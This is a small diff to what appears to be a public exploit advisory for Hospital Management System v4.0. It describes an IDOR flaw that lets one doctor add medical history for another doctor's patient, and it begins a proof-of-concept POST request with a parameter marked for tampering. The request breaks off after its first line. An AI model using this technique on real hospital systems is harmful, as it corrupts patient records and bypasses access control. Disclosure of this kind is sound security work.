@@ -7,7 +7,7 @@
 ## Exploit Description:
 ## Hospital Management System v4.0 suffers from IDOR - Broken Access Control Vulnerability allowing attacker doctor to add medical history for patient who is managed by other doctor(horizontal privilege escalation).
 
-## -----------------------------------------------POC-------------------------------------------------------------------
+## ---------------------------------POC-----------------------------
 ```
 POST /hospital/hms/doctor/view-patient.php?viewid=2(CHANGE HERE) HTTP/1.1
 ...
